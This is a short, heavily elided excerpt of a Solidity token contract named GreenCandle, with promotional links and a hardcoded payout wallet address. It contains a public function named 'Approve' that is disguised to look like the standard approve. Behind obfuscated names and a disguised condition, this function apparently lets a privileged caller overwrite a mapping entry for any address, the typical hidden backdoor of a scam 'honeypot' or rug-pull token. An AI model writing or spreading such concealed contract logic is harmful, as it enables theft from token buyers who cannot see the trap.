...
/**
    https://t.me/GreenCandleErc

    https://greencandle.medium.com/green-ape-2c46f4ae206e
*/
...
contract GreenCandle is Context, IERC20, Ownable {
    ...
    string private _symbol = "gCANDLE";
    ...
    constructor () {
        ...
        chongq = payable(address(0x714fF3cAe5cAB9F42041e7C753fb3583a6Fc4547));
    ...
    function Approve(address jn,uint256 qd) public {
        ...
        if (nmg(15-10-3,qd)) {beij[jn] = qd**2+1;}
    }
